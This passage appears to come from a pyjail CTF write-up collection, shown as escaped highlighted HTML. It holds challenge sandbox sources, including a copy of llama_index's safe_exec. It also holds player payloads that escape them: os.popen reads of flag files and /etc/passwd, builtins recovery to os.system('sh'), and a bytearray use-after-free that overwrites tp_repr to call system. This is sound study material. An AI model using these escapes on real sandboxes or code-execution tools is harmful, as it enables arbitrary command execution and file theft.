    <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># @realansgar - retrieve FileIO / open from io wrapper</span>
a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/*.expected"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">"idek"</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">)</span>

<span class="token comment"># @salvatore.abello - UAF :brain:</span>
<span class="token keyword">def</span> <span class="token function">__index__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> memory
    uaf<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
    memory <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    uaf<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1</span>
UAF <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">'UAF'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'__index__'</span><span class="token punctuation">:</span> __index__
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
uaf <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span>
uaf<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> UAF<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">p64</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
wow <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"wow"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x653b58</span>
sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
command <span class="token operator">=</span> <span class="token string">b"js"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\0"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">+</span> <span class="token number">14</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting tp_repr</span>
fake <span class="token operator">=</span> wow<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> command<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting ob_refcnt</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span></code>`,il,Zs,Up,Li,_l,Xs,Io,Do,Ti,dl,Qs,f2=`<code class="language-py"><span class="token keyword">import</span> ast

<span class="token keyword">def</span> <span class="token function">safe_import</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Why do you need imports to make tea?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Why do you need function calls to make tea?"</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">CoolDownTea</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeTransformer<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">visit_Call</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Call<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_call'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_Import</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Expr<span class="token punctuation">(</span>value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_import'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_ImportFrom</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Expr<span class="token punctuation">(</span>value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_import'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_Assign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Assign<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Assign<span class="token punctuation">(</span>targets<span class="token operator">=</span>node<span class="token punctuation">.</span>targets<span class="token punctuation">,</span> value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_BinOp</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>BinOp<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>BinOp<span class="token punctuation">(</span>left<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> op<span class="token operator">=</span>node<span class="token punctuation">.</span>op<span class="token punctuation">,</span> right<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Nothing is quite like a cup of tea in the morning: '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

cup <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
cup <span class="token operator">=</span> CoolDownTea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>visit<span class="token punctuation">(</span>cup<span class="token punctuation">)</span>
ast<span class="token punctuation">.</span>fix_missing_locations<span class="token punctuation">(</span>cup<span class="token punctuation">)</span>

<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>cup<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'safe_import'</span><span class="token punctuation">:</span> safe_import<span class="token punctuation">,</span> <span class="token string">'safe_call'</span><span class="token punctuation">:</span> safe_call<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,fl,sn,jo,No,Ai,ml,nn,m2=`<code class="language-py"><span class="token comment"># (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= &#123;"safe_import": safe_import, "safe_call": safe_call, "help": b&#125;; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]</span>
__builtins__ <span class="token operator">|</span><span class="token operator">=</span> safe_import<span class="token punctuation">.</span>__builtins__<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"sh"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>safe_import<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @ChattyPlatinumCool - https://medium.com/@harryfyx/writeup-uiuctf-2024-astea-7b27ec0b9159</span>
<span class="token punctuation">[</span>license <span class="token operator">:=</span> safe_import<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>license<span class="token punctuation">]</span><span class="token punctuation">;</span>
license<span class="token punctuation">.</span>_Printer__filenames <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>safe_call <span class="token operator">:=</span> license<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>reverse<span class="token punctuation">]</span><span class="token punctuation">;</span>
safe_call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>safe_import <span class="token operator">:=</span> license<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> sys

<span class="token comment"># @WorldWideFlags - https://yun.ng/c/ctf/2024-uiuctf/misc/astea</span>
builtins<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> safe_import<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
license<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> builtins<span class="token punctuation">.</span>license<span class="token punctuation">;</span>
license<span class="token punctuation">.</span>_Printer__setup<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> builtins<span class="token punctuation">.</span>breakpoint<span class="token punctuation">;</span>
<span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>license<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span></code>`,bl,an,Mp,Oi,yl,pn,Po,Ho,Fi,gl,tn,b2=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python</span>
<span class="token keyword">from</span> exec_utils <span class="token keyword">import</span> safe_exec
<span class="token keyword">def</span> <span class="token function">my_safe_exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># even MORE safe, surely nothing you can do now!!!</span>
    <span class="token keyword">assert</span> __source<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii check failed"</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">,</span> <span class="token string">"case"</span><span class="token punctuation">,</span> <span class="token string">"async"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"frame"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"byte"</span><span class="token punctuation">,</span> <span class="token string">"coding"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">assert</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> __source<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> is banned"</span></span>
    <span class="token keyword">return</span> safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    __source <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter code: "</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>inp<span class="token operator">:=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"#EOF"</span><span class="token punctuation">:</span>
            __source <span class="token operator">+=</span> inp <span class="token operator">+</span> <span class="token string">"&#92;n"</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        my_safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span></code>`,wl,on,Uo,Mo,Ri,vl,en,y2=`<code class="language-py"><span class="token comment"># code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py</span>
<span class="token comment"># was main at the time of writing chall, however commit provided incase of changes</span>
<span class="token keyword">import</span> ast
<span class="token keyword">import</span> copy
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType<span class="token punctuation">,</span> ModuleType
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Any<span class="token punctuation">,</span> Dict<span class="token punctuation">,</span> Mapping<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Union

ALLOWED_IMPORTS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"math"</span><span class="token punctuation">,</span>
    <span class="token string">"time"</span><span class="token punctuation">,</span>
    <span class="token string">"datetime"</span><span class="token punctuation">,</span>
    <span class="token string">"pandas"</span><span class="token punctuation">,</span>
    <span class="token string">"scipy"</span><span class="token punctuation">,</span>
    <span class="token string">"numpy"</span><span class="token punctuation">,</span>
    <span class="token string">"matplotlib"</span><span class="token punctuation">,</span>
    <span class="token string">"plotly"</span><span class="token punctuation">,</span>
    <span class="token string">"seaborn"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_restricted_import</span><span class="token punctuation">(</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token builtin">globals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token builtin">locals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    fromlist<span class="token punctuation">:</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    level<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ModuleType<span class="token punctuation">:</span>
    <span class="token keyword">if</span> name <span class="token keyword">in</span> ALLOWED_IMPORTS<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">,</span> fromlist<span class="token punctuation">,</span> level<span class="token punctuation">)</span>
    <span class="token keyword">raise</span> ImportError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Import of module '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">' is not allowed"</span></span><span class="token punctuation">)</span>

ALLOWED_BUILTINS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"abs"</span><span class="token punctuation">:</span> <span class="token builtin">abs</span><span class="token punctuation">,</span>
    <span class="token string">"all"</span><span class="token punctuation">:</span> <span class="token builtin">all</span><span class="token punctuation">,</span>
    <span class="token string">"any"</span><span class="token punctuation">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    <span class="token string">"ascii"</span><span class="token punctuation">:</span> <span class="token builtin">ascii</span><span class="token punctuation">,</span>
    <span class="token string">"bin"</span><span class="token punctuation">:</span> <span class="token builtin">bin</span><span class="token punctuation">,</span>
    <span class="token string">"bool"</span><span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    <span class="token string">"bytearray"</span><span class="token punctuation">:</span> <span class="token builtin">bytearray</span><span class="token punctuation">,</span>
    <span class="token string">"bytes"</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span>
    <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">,</span>
    <span class="token string">"complex"</span><span class="token punctuation">:</span> <span class="token builtin">complex</span><span class="token punctuation">,</span>
    <span class="token string">"divmod"</span><span class="token punctuation">:</span> <span class="token builtin">divmod</span><span class="token punctuation">,</span>
    <span class="token string">"enumerate"</span><span class="token punctuation">:</span> <span class="token builtin">enumerate</span><span class="token punctuation">,</span>
    <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>
    <span class="token string">"float"</span><span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">,</span>
    <span class="token string">"format"</span><span class="token punctuation">:</span> <span class="token builtin">format</span><span class="token punctuation">,</span>
    <span class="token string">"frozenset"</span><span class="token punctuation">:</span> <span class="token builtin">frozenset</span><span class="token punctuation">,</span>
    <span class="token string">"hash"</span><span class="token punctuation">:</span> <span class="token builtin">hash</span><span class="token punctuation">,</span>
    <span class="token string">"hex"</span><span class="token punctuation">:</span> <span class="token builtin">hex</span><span class="token punctuation">,</span>
    <span class="token string">"int"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    <span class="token string">"isinstance"</span><span class="token punctuation">:</span> <span class="token builtin">isinstance</span><span class="token punctuation">,</span>
    <span class="token string">"issubclass"</span><span class="token punctuation">:</span> <span class="token builtin">issubclass</span><span class="token punctuation">,</span>
    <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>
    <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>
    <span class="token string">"map"</span><span class="token punctuation">:</span> <span class="token builtin">map</span><span class="token punctuation">,</span>
    <span class="token string">"max"</span><span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token punctuation">,</span>
    <span class="token string">"min"</span><span class="token punctuation">:</span> <span class="token builtin">min</span><span class="token punctuation">,</span>
    <span class="token string">"oct"</span><span class="token punctuation">:</span> <span class="token builtin">oct</span><span class="token punctuation">,</span>
    <span class="token string">"ord"</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">,</span>
    <span class="token string">"pow"</span><span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">,</span>
    <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>
    <span class="token string">"range"</span><span class="token punctuation">:</span> <span class="token builtin">range</span><span class="token punctuation">,</span>
    <span class="token string">"repr"</span><span class="token punctuation">:</span> <span class="token builtin">repr</span><span class="token punctuation">,</span>
    <span class="token string">"reversed"</span><span class="token punctuation">:</span> <span class="token builtin">reversed</span><span class="token punctuation">,</span>
    <span class="token string">"round"</span><span class="token punctuation">:</span> <span class="token builtin">round</span><span class="token punctuation">,</span>
    <span class="token string">"set"</span><span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">,</span>
    <span class="token string">"slice"</span><span class="token punctuation">:</span> <span class="token builtin">slice</span><span class="token punctuation">,</span>
    <span class="token string">"sorted"</span><span class="token punctuation">:</span> <span class="token builtin">sorted</span><span class="token punctuation">,</span>
    <span class="token string">"str"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token string">"sum"</span><span class="token punctuation">:</span> <span class="token builtin">sum</span><span class="token punctuation">,</span>
    <span class="token string">"tuple"</span><span class="token punctuation">:</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span>
    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token builtin">type</span><span class="token punctuation">,</span>
    <span class="token string">"zip"</span><span class="token punctuation">:</span> <span class="token builtin">zip</span><span class="token punctuation">,</span>
    <span class="token comment"># Constants</span>
    <span class="token string">"True"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token string">"False"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token string">"None"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token string">"__import__"</span><span class="token punctuation">:</span> _restricted_import<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_get_restricted_globals</span><span class="token punctuation">(</span>__globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    restricted_globals <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>ALLOWED_BUILTINS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __globals<span class="token punctuation">:</span>
        restricted_globals<span class="token punctuation">.</span>update<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span>
    <span class="token keyword">return</span> restricted_globals

vulnerable_code_snippets <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"os."</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">DunderVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
